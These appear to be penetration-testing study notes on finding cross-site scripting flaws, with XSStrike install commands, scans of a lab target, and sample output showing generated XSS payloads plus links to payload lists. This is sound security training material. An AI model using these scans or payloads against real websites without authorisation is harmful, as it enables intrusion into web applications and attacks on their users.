# XSS Discovery

## Automated Discovery

Nessus, Burp Pro, or ZAP

Passive Scan : reviews client-side code for potential DOM-based vulnerabilities
Active Scan : sends various types of payloads to attempt to trigger an XSS through payload injection in the page source

Open-source tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSe

git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]

## Manual Discovery

Identifying advanced XSS vulnerabilities requires advanced code review skills

XSS Payloads :
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

## Code Review

The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code.

POST parameters :

python xsstrike.py -u "http://example.com/search.php" --data "q=query"


## LAB

git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

python xsstrike.py -u "http://94.237.56.188:41843/?fullname=test&username=test&password=test&email=test%40aaj.com"

	XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <d3V%09ONPOIntEreNtEr%0a=%0aconfirm()>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] 
